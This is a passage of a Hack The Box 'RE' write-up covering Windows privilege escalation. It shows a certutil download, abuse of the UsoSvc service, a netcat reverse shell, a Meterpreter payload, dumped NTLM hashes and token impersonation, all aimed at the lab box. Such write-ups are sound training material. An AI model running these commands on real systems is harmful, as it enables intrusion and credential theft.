+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+iis apppool\re
+
+c:\windows\system32\inetsrv&gt;
+</code></pre></div></div>
+
+<p>Then use PowerUp from Powersploit to look for privesc vectors:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\ProgramData&gt;certutil -urlcache -f http://10.10.16.9/PowerUp.ps1 powerup.ps1
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+c:\ProgramData&gt;powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\ProgramData&gt; import-module .\powerup.ps1
+PS C:\ProgramData&gt; invoke-allchecks
+
+[...]
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+</code></pre></div></div>
+
+<p>I have write access to the <code class="language-plaintext highlighter-rouge">UsoSvc</code> service so I can change the BinPath and execute anything I want as SYSTEM. The default <code class="language-plaintext highlighter-rouge">Invoke-ServiceAbuse</code> parameters will simply add a new user with local admin rights.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\ProgramData&gt; Invoke-ServiceAbuse -Name 'UsoSvc'
+
+ServiceAbused Command
+------------- -------
+UsoSvc        net user john Password123! /add &amp;&amp; net localgroup Administrators john /add
+</code></pre></div></div>
+
+<p>Instead I can pop a reverse shell using netcat I uploaded earlier.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\ProgramData&gt; Invoke-ServiceAbuse -Name 'UsoSvc' -command 'C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.16.9 8888'
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-re/system.png" alt="" /></p>
+
+<p>I have SYSTEM but I can’t read the flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;icacls root.txt
+root.txt NT AUTHORITY\SYSTEM:(I)(F)
+         BUILTIN\Administrators:(I)(F)
+         RE\Administrator:(I)(F)
+         RE\coby:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+Access is denied.
+</code></pre></div></div>
+
+<p>I also lose my shell after a few seconds because the process doesn’t respond to the service manager so it gets terminated.</p>
+
+<p>I’m going to drop a Meterpreter payload on the box, run it as SYSTEM and quickly migrate to a new process so I don’t lose the shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o met.exe LHOST=10.10.16.9 LPORT=4444
+
+C:\Windows\System32\spool\drivers\color&gt;certutil -urlcache -f http://10.10.16.9/met.exe met.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-re/msf.png" alt="" /></p>
+
+<p>Got a stable shell now, let’s dump the hashes first:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:caf97bbc4c410103485a3cf950496493:::
+cam:1002:aad3b435b51404eeaad3b435b51404ee:1916525df2db99ef56a75152807da93d:::
+coby:1000:aad3b435b51404eeaad3b435b51404ee:fa88e03e41fdf7b707979c50d57c06cf:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+john:1003:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+luke:1001:aad3b435b51404eeaad3b435b51404ee:3670611a3c1a68757854520547ab5f24:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:275fb2a3ea8b2433976482b69b94497b:::
+</code></pre></div></div>
+
+<p>I can’t read <code class="language-plaintext highlighter-rouge">root.txt</code> because it’s encrypted for Coby:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;cipher /c root.txt
+
+ Listing C:\Users\Administrator\Desktop\
+ New files added to this directory will not be encrypted.
+
+E root.txt
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    RE\Administrator [Administrator(Administrator@RE)]
+    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D
+
+    coby(coby@RE)
+    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0
+
+  No recovery certificate found.
+
+  Key Information:
+    Algorithm: AES
+    Key Length: 256
+    Key Entropy: 256
+</code></pre></div></div>
+
+<p>I’ll do it the easy and just impersonate Coby since I have SYSTEM access.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; load incognito
+[-] The 'incognito' extension has already been loaded.
+meterpreter &gt; list_tokens -u coby
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+IIS APPPOOL\re
+IIS APPPOOL\REblog
+NT AUTHORITY\IUSR
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+RE\cam
+RE\coby
+RE\luke
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+IIS APPPOOL\ip
+
+meterpreter &gt; impersonate_token RE\\coby
+[+] Delegation token available
+[+] Successfully impersonated user RE\coby
+</code></pre></div></div>
+
+<p>And I can now read the flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell
+Process 3760 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt
+type c:\users\administrator\desktop\root.txt
+1B4FB90...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cve-2018-20253" class="page__taxonomy-item" rel="tag">CVE-2018-20253</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#libreoffice" class="page__taxonomy-item" rel="tag">libreoffice</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#macros" class="page__taxonomy-item" rel="tag">macros</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ods" class="page__taxonomy-item" rel="tag">ods</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#usosvc" class="page__taxonomy-item" rel="tag">usosvc</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#yara" class="page__taxonomy-item" rel="tag">yara</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-02-01T00:00:00+01:00">February 01, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/bbsctf-evilconneck/" class="pagination--pager" title="Mini WebSocket CTF
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-json/" class="pagination--pager" title="JSON - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
